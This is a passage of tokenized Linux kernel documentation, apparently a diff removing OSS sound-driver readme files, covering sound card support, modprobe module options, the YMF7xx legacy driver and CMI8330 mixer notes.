"is", "a", "microcontroller", "which", "initializes", "the", "card", "to", "match", "the", "EEPROM", "settings", "when", "the", "machine", "is", "powered", "on", ".", "These", "cards", "actually", "behave", "just", "like", "they", "have", "jumpers", "for", "all", "of", "the", "settings", ".", "Configure", "driver", "for", "MSS", ",", "MPU", ",", "SB", "/", "SB", "Pro", "and", "OPL3", "supports", "with", "these", "cards", ".", "There", "are", "some", "new", "Sound", "Galaxies", "in", "the", "market", ".", "I", "have", "no", "experience", "with", "them", "so", "read", "the", "card", "'", "s", "manual", "carefully", ".", "ESS", "ES1688", "and", "ES688", "'", "AudioDrive", "'", "based", "cards", "Support", "for", "these", "two", "ESS", "chips", "is", "embedded", "in", "the", "SB", "driver", ".", "Configure", "these", "cards", "just", "like", "SB", ".", "Enable", "the", "'", "SB", "MPU401", "MIDI", "port", "'", "if", "you", "want", "to", "use", "MIDI", "features", "of", "ES1688", ".", "ES688", "doesn", "'", "t", "have", "MPU", "mode", "so", "you", "don", "'", "t", "need", "to", "enable", "it", "(", "the", "driver", "uses", "normal", "SB", "MIDI", "automatically", "with", "ES688", ")", ".", "NOTE", "!", "ESS", "cards", "are", "not", "compatible", "with", "MSS", "/", "WSS", "so", "don", "'", "t", "worry", "if", "MSS", "support", "of", "OSS", "doesn", "'", "t", "work", "with", "it", ".", "There", "are", "some", "ES1688", "/", "688", "based", "sound", "cards", "and", "(", "particularly", ")", "motherboards", "which", "use", "software", "configurable", "I", "/", "O", "port", "relocation", "feature", "of", "the", "chip", ".", "This", "ESS", "proprietary", "feature", "is", "supported", "only", "by", "OSS", "/", "Linux", ".", "There", "are", "ES1688", "based", "cards", "which", "use", "different", "interrupt", "pin", "assignment", "than", "recommended", "by", "ESS", "(", "5", ",", "7", ",", "9", "/", "2", "and", "10", ")", ".", "In", "this", "case", "all", "IRQs", "don", "'", "t", "work", ".", "At", "least", "a", "card", "called", "(", "Pearl", "?", ")", "Hypersound", "16", "supports", "IRQ", "15", "but", "it", "doesn", "'", "t", "work", ".", "ES1868", "is", "a", "PnP", "chip", "which", "is", "(", "supposed", "to", "be", ")", "compatible", "with", "ESS1688", "probably", "works", "with", "OSS", "/", "Free", "after", "initialization", "using", "isapnptools", ".", "Reveal", "cards", "There", "are", "several", "different", "cards", "made", "/", "marketed", "by", "Reveal", ".", "Some", "of", "them", "are", "compatible", "with", "SoundScape", "and", "some", "use", "the", "MAD16", "chip", ".", "You", "may", "have", "to", "look", "at", "the", "card", "and", "try", "to", "identify", "its", "origin", ".", "Diamond", "The", "oldest", "(", "Sierra", "Aria", "based", ")", "sound", "cards", "made", "by", "Diamond", "are", "not", "supported", "(", "they", "may", "work", "if", "the", "card", "is", "initialized", "using", "DOS", ")", ".", "The", "recent", "(", "LX", "?", ")", "models", "are", "based", "on", "the", "MAD16", "chip", "which", "is", "supported", "by", "the", "driver", ".", "Audio", "Excel", "DSP16", "Support", "for", "this", "card", "is", "currently", "not", "functional", ".", "A", "new", "driver", "for", "it", "should", "be", "available", "later", "this", "year", ".", "PCMCIA", "cards", "Sorry", ",", "can", "'", "t", "help", ".", "Some", "cards", "may", "work", "and", "some", "don", "'", "t", ".", "TI", "TM4000M", "notebooks", "These", "computers", "have", "a", "built", "in", "sound", "support", "based", "on", "the", "Jazz", "chipset", ".", "Look", "at", "the", "instructions", "for", "MV", "Jazz", "(", "above", ")", ".", "It", "'", "s", "also", "important", "to", "note", "that", "there", "is", "something", "wrong", "with", "the", "mouse", "port", "and", "sound", "at", "least", "on", "some", "TM", "models", ".", "Don", "'", "t", "enable", "the", "\"", "C", "&", "T", "82C710", "mouse", "port", "support", "\"", "when", "configuring", "Linux", ".", "Having", "it", "enabled", "is", "likely", "to", "cause", "mysterious", "problems", "and", "kernel", "failures", "when", "sound", "is", "used", ".", "miroSOUND", "The", "miroSOUND", "PCM1", "-", "pro", ",", "PCM12", "and", "PCM20", "radio", "has", "been", "used", "successfully", ".", "These", "cards", "are", "based", "on", "the", "MAD16", ",", "OPL4", ",", "and", "CS4231A", "chips", "and", "everything", "said", "in", "the", "section", "about", "MAD16", "cards", "applies", "here", ",", "too", ".", "The", "only", "major", "difference", "between", "the", "PCMxx", "and", "other", "MAD16", "cards", "is", "that", "instead", "of", "the", "mixer", "in", "the", "CS4231", "codec", "a", "separate", "mixer", "controlled", "by", "an", "on", "-", "board", "80C32", "microcontroller", "is", "used", ".", "Control", "of", "the", "mixer", "takes", "place", "via", "the", "ACI", "(", "miro", "'", "s", "audio", "control", "interface", ")", "protocol", "that", "is", "implemented", "in", "a", "separate", "lowlevel", "driver", ".", "Make", "sure", "you", "compile", "this", "ACI", "driver", "together", "with", "the", "normal", "MAD16", "support", "when", "you", "use", "a", "miroSOUND", "PCMxx", "card", ".", "The", "ACI", "mixer", "is", "controlled", "by", "/", "dev", "/", "mixer", "and", "the", "CS4231", "mixer", "by", "/", "dev", "/", "mixer1", "(", "depends", "on", "load", "time", ")", ".", "Only", "in", "special", "cases", "you", "want", "to", "change", "something", "regularly", "on", "the", "CS4231", "mixer", ".", "The", "miroSOUND", "PCM12", "and", "PCM20", "radio", "is", "capable", "of", "full", "duplex", "operation", "(", "simultaneous", "PCM", "replay", "and", "recording", ")", ",", "which", "allows", "you", "to", "implement", "nice", "real", "-", "time", "signal", "processing", "audio", "effect", "software", "and", "network", "telephones", ".", "The", "ACI", "mixer", "has", "to", "be", "switched", "into", "the", "\"", "solo", "\"", "mode", "for", "duplex", "operation", "in", "order", "to", "avoid", "feedback", "caused", "by", "the", "mixer", "(", "input", "hears", "output", "signal", ")", ".", "You", "can", "de", "-", "/", "activate", "this", "mode", "through", "toggling", "the", "record", "button", "for", "the", "wave", "controller", "with", "an", "OSS", "-", "mixer", ".", "The", "PCM20", "contains", "a", "radio", "tuner", ",", "which", "is", "also", "controlled", "by", "ACI", ".", "This", "radio", "tuner", "is", "supported", "by", "the", "ACI", "driver", "together", "with", "the", "miropcm20", ".", "o", "module", ".", "Also", "the", "7", "-", "band", "equalizer", "is", "integrated", "(", "limited", "by", "the", "OSS", "-", "design", ")", ".", "Development", "has", "started", "and", "maybe", "finished", "for", "the", "RDS", "decoder", "on", "this", "card", ",", "too", ".", "You", "will", "be", "able", "to", "read", "RadioText", ",", "the", "Programme", "Service", "name", ",", "Programme", "TYpe", "and", "others", ".", "Even", "the", "v4l", "radio", "module", "benefits", "from", "it", "with", "a", "refined", "strength", "value", ".", "See", "aci", ".", "[", "ch", "]", "and", "miropcm20", "*", ".[", "ch", "]", "for", "more", "details", ".", "The", "following", "configuration", "parameters", "have", "worked", "fine", "for", "the", "PCM12", "in", "Markus", "Kuhn", "'", "s", "system", ",", "many", "other", "configurations", "might", "work", ",", "too", ":", "CONFIG_MAD16_BASE", "=", "0x530", ",", "CONFIG_MAD16_IRQ", "=", "11", ",", "CONFIG_MAD16_DMA", "=", "3", ",", "CONFIG_MAD16_DMA2", "=", "0", ",", "CONFIG_MAD16_MPU_BASE", "=", "0x330", ",", "CONFIG_MAD16_MPU_IRQ", "=", "10", ",", "DSP_BUFFSIZE", "=", "65536", ",", "SELECTED_SOUND_OPTIONS", "=", "0x00281000", ".", "Bas", "van", "der", "Linden", "is", "using", "his", "PCM1", "-", "pro", "with", "a", "configuration", "that", "differs", "in", ":", "CONFIG_MAD16_IRQ", "=", "7", ",", "CONFIG_MAD16_DMA", "=", "1", ",", "CONFIG_MAD16_MPU_IRQ", "=", "9", "Compaq", "Deskpro", "XL", "The", "builtin", "sound", "hardware", "of", "Compaq", "Deskpro", "XL", "is", "now", "supported", ".", "You", "need", "to", "configure", "the", "driver", "with", "MSS", "and", "OPL3", "supports", "enabled", ".", "In", "addition", "you", "need", "to", "manually", "edit", "linux", "/", "drivers", "/", "sound", "/", "local", ".", "h", "and", "to", "add", "a", "line", "containing", "\"", "#", "define", "DESKPROXL", "\"", "if", "you", "used", "make", "menuconfig", "/", "xconfig", ".", "Others", "?", "Since", "there", "are", "so", "many", "different", "sound", "cards", ",", "it", "'", "s", "likely", "that", "I", "have", "forgotten", "to", "mention", "many", "of", "them", ".", "Please", "inform", "me", "if", "you", "know", "yet", "another", "card", "which", "works", "with", "Linux", ",", "please", "inform", "me", "(", "or", "is", "anybody", "else", "willing", "to", "maintain", "a", "database", "of", "supported", "cards", "(", "just", "like", "in", "XF86", ")", "?)", ".", "Cards", "not", "supported", "yet", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "Please", "check", "the", "version", "of", "sound", "driver", "you", "are", "using", "before", "complaining", "that", "your", "card", "is", "not", "supported", ".", "It", "'", "s", "possible", "you", "are", "using", "a", "driver", "version", "which", "was", "released", "months", "before", "your", "card", "was", "introduced", ".", "First", "of", "all", ",", "there", "is", "an", "easy", "way", "to", "make", "most", "sound", "cards", "work", "with", "Linux", ".", "Just", "use", "the", "DOS", "based", "driver", "to", "initialize", "the", "card", "to", "a", "known", "state", ",", "then", "use", "loadlin", ".", "exe", "to", "boot", "Linux", ".", "If", "Linux", "is", "configured", "to", "use", "the", "same", "I", "/", "O", ",", "IRQ", "and", "DMA", "numbers", "as", "DOS", ",", "the", "card", "could", "work", ".", "(", "ctrl", "-", "alt", "-", "del", "can", "be", "used", "in", "place", "of", "loadlin", ".", "exe", "but", "it", "doesn", "'", "t", "work", "with", "new", "motherboards", ")", ".", "This", "method", "works", "also", "with", "all", "/", "most", "PnP", "sound", "cards", ".", "Don", "'", "t", "get", "fooled", "with", "SB", "compatibility", ".", "Most", "cards", "are", "compatible", "with", "SB", "but", "that", "may", "require", "a", "TSR", "which", "is", "not", "possible", "with", "Linux", ".", "If", "the", "card", "is", "compatible", "with", "MSS", ",", "it", "'", "s", "a", "better", "choice", ".", "Some", "cards", "don", "'", "t", "work", "in", "the", "SB", "and", "MSS", "modes", "at", "the", "same", "time", ".", "Then", "there", "are", "cards", "which", "are", "no", "longer", "manufactured", "and", "/", "or", "which", "are", "relatively", "rarely", "used", "(", "such", "as", "the", "8", "bit", "ProAudioSpectrum", "models", ")", ".", "It", "'", "s", "extremely", "unlikely", "that", "such", "cards", "ever", "get", "supported", ".", "Adding", "support", "for", "a", "new", "card", "requires", "much", "work", "and", "increases", "time", "required", "in", "maintaining", "the", "driver", "(", "some", "changes", "need", "to", "be", "done", "to", "all", "low", "level", "drivers", "and", "be", "tested", "too", ",", "maybe", "with", "multiple", "operating", "systems", ")", ".", "For", "this", "reason", "I", "have", "made", "a", "decision", "to", "not", "support", "obsolete", "cards", ".", "It", "'", "s", "possible", "that", "someone", "else", "makes", "a", "separately", "distributed", "driver", "(", "diffs", ")", "for", "the", "card", ".", "Writing", "a", "driver", "for", "a", "new", "card", "is", "not", "possible", "if", "there", "are", "no", "programming", "information", "available", "about", "the", "card", ".", "If", "you", "don", "'", "t", "find", "your", "new", "card", "from", "this", "file", ",", "look", "from", "the", "home", "page", "(", "http", ":", "//", "www", ".", "opensound", ".", "com", "/", "ossfree", ")", ".", "Then", "please", "contact", "manufacturer", "of", "the", "card", "and", "ask", "if", "they", "have", "(", "or", "are", "willing", "to", ")", "released", "technical", "details", "of", "the", "card", ".", "Do", "this", "before", "contacting", "me", ".", "I", "can", "only", "answer", "'", "no", "'", "if", "there", "are", "no", "programming", "information", "available", ".", "I", "have", "made", "decision", "to", "not", "accept", "code", "based", "on", "reverse", "engineering", "to", "the", "driver", ".", "There", "are", "three", "main", "reasons", ":", "First", "I", "don", "'", "t", "want", "to", "break", "relationships", "to", "sound", "card", "manufacturers", ".", "The", "second", "reason", "is", "that", "maintaining", "and", "supporting", "a", "driver", "without", "any", "specs", "will", "be", "a", "pain", ".", "The", "third", "reason", "is", "that", "companies", "have", "freedom", "to", "refuse", "selling", "their", "products", "to", "other", "than", "Windows", "users", ".", "Some", "companies", "don", "'", "t", "give", "low", "level", "technical", "information", "about", "their", "products", "to", "public", "or", "at", "least", "their", "require", "signing", "a", "NDA", ".", "It", "'", "s", "not", "possible", "to", "implement", "a", "freeware", "driver", "for", "them", ".", "However", "it", "'", "s", "possible", "that", "support", "for", "such", "cards", "become", "available", "in", "the", "commercial", "version", "of", "this", "driver", "(", "see", "http", ":", "//", "www", ".", "4Front", "-", "tech", ".", "com", "/", "oss", ".", "html", "for", "more", "info", ")", ".", "There", "are", "some", "common", "audio", "chipsets", "that", "are", "not", "supported", "yet", ".", "For", "example", "Sierra", "Aria", "and", "IBM", "Mwave", ".", "It", "'", "s", "possible", "that", "these", "architectures", "get", "some", "support", "in", "future", "but", "I", "can", "'", "t", "make", "any", "promises", ".", "Just", "look", "at", "the", "home", "page", "(", "http", ":", "//", "www", ".", "opensound", ".", "com", "/", "ossfree", "/", ")", "for", "latest", "info", ".", "Information", "about", "unsupported", "sound", "cards", "and", "chipsets", "is", "welcome", "as", "well", "as", "free", "copies", "of", "sound", "cards", ",", "SDKs", "and", "operating", "systems", ".", "If", "you", "have", "any", "corrections", "and", "/", "or", "comments", ",", "please", "contact", "me", ".", "Hannu", "Savolainen", "hannu", "@", "opensound", ".", "com", "home", "page", "of", "OSS", "/", "Free", ":", "http", ":", "//", "www", ".", "opensound", ".", "com", "/", "ossfree", "home", "page", "of", "commercial", "OSS", "(", "Open", "Sound", "System", ")", "drivers", ":", "http", ":", "//", "www", ".", "opensound", ".", "com", "/", "oss", ".", "html", "@", "@", "-", "1", ",", "106", "+", "0", ",", "0", "@", "@", "Building", "a", "modular", "sound", "driver", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "=", "The", "following", "information", "is", "current", "as", "of", "linux", "-", "2", ".", "1", ".", "85", ".", "Check", "the", "other", "readme", "files", ",", "especially", "README", ".", "OSS", ",", "for", "information", "not", "specific", "to", "making", "sound", "modular", ".", "First", ",", "configure", "your", "kernel", ".", "This", "is", "an", "idea", "of", "what", "you", "should", "be", "setting", "in", "the", "sound", "section", ":", "<", "M", ">", "Sound", "card", "support", "<", "M", ">", "100", "%", "Sound", "Blaster", "compatibles", "(", "SB16", "/", "32", "/", "64", ",", "ESS", ",", "Jazz16", ")", "support", "I", "have", "SoundBlaster", ".", "Select", "your", "card", "from", "the", "list", ".", "<", "M", ">", "Generic", "OPL2", "/", "OPL3", "FM", "synthesizer", "support", "<", "M", ">", "FM", "synthesizer", "(", "YM3812", "/", "OPL", "-", "3", ")", "support", "If", "you", "don", "'", "t", "set", "these", ",", "you", "will", "probably", "find", "you", "can", "play", ".", "wav", "files", "but", "not", ".", "midi", ".", "As", "the", "help", "for", "them", "says", ",", "set", "them", "unless", "you", "know", "your", "card", "does", "not", "use", "one", "of", "these", "chips", "for", "FM", "support", ".", "Once", "you", "are", "configured", ",", "make", "zlilo", ",", "modules", ",", "modules_install", ";", "reboot", ".", "Note", "that", "it", "is", "no", "longer", "necessary", "or", "possible", "to", "configure", "sound", "in", "the", "drivers", "/", "sound", "dir", ".", "Now", "one", "simply", "configures", "and", "makes", "one", "'", "s", "kernel", "and", "modules", "in", "the", "usual", "way", ".", "Then", ",", "add", "to", "your", "/", "etc", "/", "modprobe", ".", "d", "/", "oss", ".", "conf", "something", "like", ":", "alias", "char", "-", "major", "-", "14", "-", "*", "sb", "install", "sb", "/", "sbin", "/", "modprobe", "-", "i", "sb", "&", "&", "/", "sbin", "/", "modprobe", "adlib_card", "options", "sb", "io", "=", "0x220", "irq", "=", "7", "dma", "=", "1", "dma16", "=", "5", "mpu_io", "=", "0x330", "options", "adlib_card", "io", "=", "0x388", "#", "FM", "synthesizer", "Alternatively", ",", "if", "you", "have", "compiled", "in", "kernel", "level", "ISAPnP", "support", ":", "alias", "char", "-", "major", "-", "14", "sb", "softdep", "sb", "post", ":", "adlib_card", "options", "adlib_card", "io", "=", "0x388", "The", "effect", "of", "this", "is", "that", "the", "sound", "driver", "and", "all", "necessary", "bits", "and", "pieces", "autoload", "on", "demand", ",", "assuming", "you", "use", "kerneld", "(", "a", "sound", "choice", ")", "and", "autoclean", "when", "not", "in", "use", ".", "Also", ",", "options", "for", "the", "device", "drivers", "are", "set", ".", "They", "will", "not", "work", "without", "them", ".", "Change", "as", "appropriate", "for", "your", "card", ".", "If", "you", "are", "not", "yet", "using", "the", "very", "cool", "kerneld", ",", "you", "will", "have", "to", "\"", "modprobe", "k", "sb", "\"", "yourself", "to", "get", "things", "going", ".", "Eventually", "things", "may", "be", "fixed", "so", "that", "this", "kludgery", "is", "not", "necessary", ";", "for", "the", "time", "being", ",", "it", "seems", "to", "work", "well", ".", "Replace", "'", "sb", "'", "with", "the", "driver", "for", "your", "card", ",", "and", "give", "it", "the", "right", "options", ".", "To", "find", "the", "filename", "of", "the", "driver", ",", "look", "in", "/", "lib", "/", "modules", "/", "<", "kernel", "-", "version", ">", "/", "misc", ".", "Mine", "looks", "like", ":", "adlib_card", ".", "o", "#", "This", "is", "the", "generic", "OPLx", "driver", "opl3", ".", "o", "#", "The", "OPL3", "driver", "sb", ".", "o", "#", "<", "<", "The", "SoundBlaster", "driver", ".", "Yours", "may", "differ", ".", ">>", "sound", ".", "o", "#", "The", "sound", "driver", "uart401", ".", "o", "#", "Used", "by", "sb", ",", "maybe", "other", "cards", "Whichever", "card", "you", "have", ",", "try", "feeding", "it", "the", "options", "that", "would", "be", "the", "default", "if", "you", "were", "making", "the", "driver", "wired", ",", "not", "as", "modules", ".", "You", "can", "look", "at", "function", "referred", "to", "by", "module_init", "(", ")", "for", "the", "card", "to", "see", "what", "args", "are", "expected", ".", "Note", "that", "at", "present", "there", "is", "no", "way", "to", "configure", "the", "io", ",", "irq", "and", "other", "parameters", "for", "the", "modular", "drivers", "as", "one", "does", "for", "the", "wired", "drivers", ".", ".", "One", "needs", "to", "pass", "the", "modules", "the", "necessary", "parameters", "as", "arguments", ",", "either", "with", "/", "etc", "/", "modprobe", ".", "d", "/", "*.", "conf", "or", "with", "command", "-", "line", "args", "to", "modprobe", ",", "e", ".", "g", ".", "modprobe", "sb", "io", "=", "0x220", "irq", "=", "7", "dma", "=", "1", "dma16", "=", "5", "mpu_io", "=", "0x330", "modprobe", "adlib_card", "io", "=", "0x388", "recommend", "using", "/", "etc", "/", "modprobe", ".", "d", "/", "*.", "conf", ".", "Persistent", "DMA", "Buffers", ":", "The", "sound", "modules", "normally", "allocate", "DMA", "buffers", "during", "open", "(", ")", "and", "deallocate", "them", "during", "close", "(", ").", "Linux", "can", "often", "have", "problems", "allocating", "DMA", "buffers", "for", "ISA", "cards", "on", "machines", "with", "more", "than", "16MB", "RAM", ".", "This", "is", "because", "ISA", "DMA", "buffers", "must", "exist", "below", "the", "16MB", "boundary", "and", "it", "is", "quite", "possible", "that", "we", "can", "'", "t", "find", "a", "large", "enough", "free", "block", "in", "this", "region", "after", "the", "machine", "has", "been", "running", "for", "any", "amount", "of", "time", ".", "The", "way", "to", "avoid", "this", "problem", "is", "to", "allocate", "the", "DMA", "buffers", "during", "module", "load", "and", "deallocate", "them", "when", "the", "module", "is", "unloaded", ".", "For", "this", "to", "be", "effective", "we", "need", "to", "load", "the", "sound", "modules", "right", "after", "the", "kernel", "boots", ",", "either", "manually", "or", "by", "an", "init", "script", ",", "and", "keep", "them", "around", "until", "we", "shut", "down", ".", "This", "is", "a", "little", "wasteful", "of", "RAM", ",", "but", "it", "guarantees", "that", "sound", "always", "works", ".", "To", "make", "the", "sound", "driver", "use", "persistent", "DMA", "buffers", "we", "need", "to", "pass", "the", "sound", ".", "o", "module", "a", "\"", "dmabuf", "=", "1", "\"", "command", "-", "line", "argument", ".", "This", "is", "normally", "done", "in", "/", "etc", "/", "modprobe", ".", "d", "/", "*.", "conf", "files", "like", "so", ":", "options", "sound", "dmabuf", "=", "1", "If", "you", "have", "16MB", "or", "less", "RAM", "or", "a", "PCI", "sound", "card", ",", "this", "is", "wasteful", "and", "unnecessary", ".", "It", "is", "possible", "that", "machine", "with", "16MB", "or", "less", "RAM", "will", "find", "this", "option", "useful", ",", "but", "if", "your", "machine", "is", "so", "memory", "-", "starved", "that", "it", "cannot", "find", "a", "64K", "block", "free", ",", "you", "will", "be", "wasting", "even", "more", "RAM", "by", "keeping", "the", "sound", "modules", "loaded", "and", "the", "DMA", "buffers", "allocated", "when", "they", "are", "not", "needed", ".", "The", "proper", "solution", "is", "to", "upgrade", "your", "RAM", ".", "But", "you", "do", "also", "have", "this", "improper", "solution", "as", "well", ".", "Use", "it", "wisely", ".", "I", "'", "m", "afraid", "I", "know", "nothing", "about", "anything", "but", "my", "setup", ",", "being", "more", "of", "a", "text", "-", "mode", "guy", "anyway", ".", "If", "you", "have", "options", "for", "other", "cards", "or", "other", "helpful", "hints", ",", "send", "them", "to", "me", ",", "Jim", "Bray", ",", "jb", "@", "as220", ".", "org", ",", "http", ":", "//", "as220", ".", "org", "/", "jb", ".", "@", "@", "-", "1", ",", "107", "+", "0", ",", "0", "@", "@", "Legacy", "audio", "driver", "for", "YMF7xx", "PCI", "cards", ".", "FIRST", "OF", "ALL", "=", "==", "==", "==", "==", "==", "=", "This", "code", "references", "YAMAHA", "'", "s", "sample", "codes", "and", "data", "sheets", ".", "I", "respect", "and", "thank", "for", "all", "people", "they", "made", "open", "the", "information", "about", "YMF7xx", "cards", ".", "And", "this", "codes", "heavily", "based", "on", "Jeff", "Garzik", "<", "jgarzik", "@", "pobox", ".", "com", ">", "'", "s", "old", "VIA", "82Cxxx", "driver", "(", "via82cxxx", ".", "c", ")", ".", "I", "also", "respect", "him", ".", "DISCLIMER", "=", "==", "==", "==", "==", "This", "driver", "is", "currently", "at", "early", "ALPHA", "stage", ".", "It", "may", "cause", "serious", "damage", "to", "your", "computer", "when", "used", ".", "PLEASE", "USE", "IT", "AT", "YOUR", "OWN", "RISK", ".", "ABOUT", "THIS", "DRIVER", "=", "==", "==", "==", "==", "==", "==", "==", "==", "This", "code", "enables", "you", "to", "use", "your", "YMF724", "[", "A", "-", "F", "]", ",", "YMF740", "[", "A", "-", "C", "]", ",", "YMF744", ",", "YMF754", "cards", ".", "When", "enabled", ",", "your", "card", "acts", "as", "\"", "SoundBlaster", "Pro", "\"", "compatible", "card", ".", "It", "can", "only", "play", "22", ".", "05kHz", "/", "8bit", "/", "Stereo", "samples", ",", "control", "external", "MIDI", "port", ".", "If", "you", "want", "to", "use", "your", "card", "as", "recent", "\"", "16", "-", "bit", "\"", "card", ",", "you", "should", "use", "Alsa", "or", "OSS", "/", "Linux", "driver", ".", "Of", "course", "you", "can", "write", "native", "PCI", "driver", "for", "your", "cards", ":", ")", "USAGE", "=", "==", "==", "#", "modprobe", "ymfsb", "(", "options", ")", "OPTIONS", "FOR", "MODULE", "=", "==", "==", "==", "==", "==", "==", "==", "==", "=", "io", ":", "SB", "base", "address", "(", "0x220", ",", "0x240", ",", "0x260", ",", "0x280", ")", "synth_io", ":", "OPL3", "base", "address", "(", "0x388", ",", "0x398", ",", "0x3a0", ",", "0x3a8", ")", "dma", ":", "DMA", "number", "(", "0", ",", "1", ",", "3", ")", "master_volume", ":", "AC", "'", "97", "PCM", "out", "Vol", "(", "0", "-", "100", ")", "spdif_out", ":", "SPDIF", "-", "out", "flag", "(", "0", ":", "disable", "1", ":", "enable", ")", "These", "options", "will", "change", "in", "future", ".", "..", "FREQUENCY", "=", "==", "==", "==", "==", "When", "playing", "sounds", "via", "this", "driver", ",", "you", "will", "hear", "its", "pitch", "is", "slightly", "lower", "than", "original", "sounds", ".", "Since", "this", "driver", "recognizes", "your", "card", "acts", "with", "21", ".", "739kHz", "sample", "rates", "rather", "than", "22", ".", "050kHz", "(", "I", "think", "it", "must", "be", "hardware", "restriction", ")", ".", "So", "many", "players", "become", "tone", "deafness", ".", "To", "prevent", "this", ",", "you", "should", "express", "some", "options", "to", "your", "sound", "player", "that", "specify", "correct", "sample", "frequency", ".", "For", "example", ",", "to", "play", "your", "MP3", "file", "correctly", "with", "mpg123", ",", "specify", "the", "frequency", "like", "following", ":", "%", "mpg123", "-", "r", "21739", "foo", ".", "mp3", "SPDIF", "OUT", "=", "==", "==", "==", "==", "With", "installing", "modules", "with", "option", "'", "spdif_out", "=", "1", "'", ",", "you", "can", "enjoy", "your", "sounds", "from", "SPDIF", "-", "out", "of", "your", "card", "(", "if", "it", "had", ")", ".", "Its", "Fs", "is", "fixed", "to", "48kHz", "(", "It", "never", "means", "the", "sample", "frequency", "become", "up", "to", "48kHz", ".", "All", "sounds", "via", "SPDIF", "-", "out", "also", "22kHz", "samples", ")", ".", "So", "your", "digital", "-", "in", "capable", "components", "has", "to", "be", "able", "to", "handle", "48kHz", "Fs", ".", "COPYING", "=", "==", "==", "==", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "modify", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "published", "by", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", ",", "or", "(", "at", "your", "option", ")", "any", "later", "version", ".", "This", "program", "is", "distributed", "in", "the", "hope", "that", "it", "will", "be", "useful", ",", "but", "WITHOUT", "ANY", "WARRANTY", ";", "without", "even", "the", "implied", "warranty", "of", "MERCHANTABILITY", "or", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", ".", "See", "the", "GNU", "General", "Public", "License", "for", "more", "details", ".", "You", "should", "have", "received", "a", "copy", "of", "the", "GNU", "General", "Public", "License", "along", "with", "this", "program", ";", "if", "not", ",", "write", "to", "the", "Free", "Software", "Foundation", ",", "Inc", ".", ",", "675", "Mass", "Ave", ",", "Cambridge", ",", "MA", "02139", ",", "USA", ".", "TODO", "=", "==", "=", "*", "support", "for", "multiple", "cards", "(", "set", "the", "different", "SB_IO", ",", "MPU_IO", ",", "OPL_IO", "for", "each", "cards", ")", "*", "support", "for", "OPL", "(", "dmfm", ")", ":", "There", "will", "be", "no", "requirements", ".", "..", ":", "-<", "AUTHOR", "=", "==", "==", "=", "Daisuke", "Nagano", "<", "breeze", ".", "nagano", "@", "nifty", ".", "ne", ".", "jp", ">", "@", "@", "-", "1", ",", "105", "+", "0", ",", "0", "@", "@", "Documentation", "for", "the", "SoundPro", "CMI8330", "extensions", "in", "the", "WSS", "driver", "(", "ad1848", ".", "o", ")", "(", "Be", "sure", "to", "read", "Documentation", "/", "sound", "/", "oss", "/", "CMI8330", "too", ")", "Ion", "Badulescu", ",", "ionut", "@", "cs", ".", "columbia", ".", "edu", "February", "24", ",", "1999", "(", "derived", "from", "the", "OPL3", "-", "SA2", "documentation", "by", "Scott", "Murray", ")", "The", "SoundPro", "CMI8330", "(", "ISA", ")", "is", "a", "chip", "usually", "found", "on", "some", "Taiwanese", "motherboards", ".", "The", "official", "name", "in", "the", "documentation", "is", "CMI8330", ",", "SoundPro", "is", "the", "nickname", "and", "the", "big", "inscription", "on", "the", "chip", "itself", ".", "The", "chip", "emulates", "a", "WSS", "as", "well", "as", "a", "SB16", ",", "but", "it", "has", "certain", "differences", "in", "the", "mixer", "section", "which", "require", "separate", "support", ".", "It", "also", "emulates", "an", "MPU401", "and", "an", "OPL3", "synthesizer", ",", "so", "you", "probably", "want", "to", "enable", "support", "for", "these", ",", "too", ".", "The", "chip", "identifies", "itself", "as", "an", "AD1848", ",", "but", "its", "mixer", "is", "significantly", "more", "advanced", "than", "the", "original", "AD1848", "one", ".", "If", "your", "system", "works", "with", "either", "WSS", "or", "SB16", "and", "you", "are", "having", "problems", "with", "some", "mixer", "controls", "(", "no", "CD", "audio", ",", "no", "line", "-", "in", ",", "etc", ")", ",", "you", "might", "want", "to", "give", "this", "driver", "a", "try", ".", "Detection", "should", "work", ",", "but", "it", "hasn", "'", "t", "been", "widely", "tested", ",", "so", "it", "might", "still", "mis", "-", "identify", "the", "chip", ".", "You", "can", "still", "force", "soundpro", "=", "1", "in", "the", "modprobe", "parameters", "for", "ad1848", ".", "Please", "let", "me", "know", "if", "it", "happens", "to", "you", ",", "so", "I", "can", "adjust", "the", "detection", "routine", ".", "The", "chip", "is", "capable", "of", "doing", "full", "-", "duplex", ",", "but", "since", "the", "driver", "sees", "it", "as", "an", "AD1848", ",", "it", "cannot", "take", "advantage", "of", "this", ".", "Moreover", ",", "the", "full", "-", "duplex", "mode", "is", "not", "achievable", "through", "the", "WSS", "interface", ",", "b", "/", "c", "it", "needs", "a", "dma16", "line", "which", "is", "assigned", "only", "to", "the", "SB16", "subdevice", "(", "with", "isapnp", ")", ".", "Windows", "documentation", "says", "the", "user", "must", "use", "WSS", "Playback", "and", "SB16", "Recording", "for", "full", "-", "duplex", ",", "so", "it", "might", "be", "possible", "to", "do", "the", "same", "thing", "under", "Linux", ".", "You", "can", "try", "loading", "up", "both", "ad1848", "and", "sb", "then", "use", "one", "for", "playback", "and", "the", "other", "for", "recording", ".", "I", "don", "'", "t", "know", "if", "this", "works", ",", "b", "/", "c", "I", "haven", "'", "t", "tested", "it", ".", "Anyway", ",", "if", "you", "try", "it", ",", "be", "very", "careful", ":", "the", "SB16", "mixer", "*", "mostly", "*", "works", ",", "but", "certain", "settings", "can", "have", "unexpected", "effects", ".", "Use", "the", "WSS", "mixer", "for", "best", "results", ".", "There", "is", "also", "a", "PCI", "SoundPro", "chip", ".", "I", "have", "not", "seen", "this", "chip", ",", "so", "I", "have", "no", "idea", "if", "the", "driver", "will", "work", "with", "it", ".", "I", "suspect", "it", "won", "'", "t", ".", "As", "with", "PnP", "cards", ",", "some", "configuration", "is", "required", ".", "There", "are", "two", "ways", "of", "doing", "this", ".", "The", "most", "common", "is", "to", "use", "the", "isapnptools", "package", "to", "initialize", "the", "card", ",", "and", "use", "the", "kernel", "module", "form", "of", "the", "sound", "subsystem", "and", "sound", "drivers", ".", "Alternatively", ",", "some", "BIOS", "'", "s", "allow", "manual", "configuration", "of", "installed", "PnP", "devices", "in", "a", "BIOS", "menu", ",", "which", "should", "allow", "using", "the", "non", "-", "modular", "sound", 